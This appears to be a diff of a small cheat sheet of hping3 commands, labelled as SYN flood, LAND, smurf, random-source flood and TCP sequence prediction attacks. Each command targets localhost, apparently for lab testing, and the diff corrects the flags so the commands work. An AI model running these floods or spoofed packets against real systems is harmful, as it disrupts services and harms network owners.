@@ -1,13 +1,13 @@
 #normal
-hping3 -s -p 80 127.0.0.1
+hping3 -S -p 80 127.0.0.1
 #SYN attack
-hping3 -s -p 80 127.0.0.1 --flood 
+hping3 -S -p 80 127.0.0.1 --flood 
 #LAN attack
-hping3 -s -p 80 127.0.0.1 -a 127.0.0.1
+hping3 -S -p 80 127.0.0.1 -a 127.0.0.1
 #smurf attack
 hping3 --icmp --flood 127.0.0.1 -a 127.0.0.1
 #random smurf attack
-hping3 -s -p 80 127.0.0.1 --flood --rand
+hping3 -S -p 80 127.0.0.1 --flood --rand-source
 #TCP sequence prediction attack
-hping3 -s -p 80 -Q 127.0.0.1
+hping3 -S -p 80 -Q 127.0.0.1
 
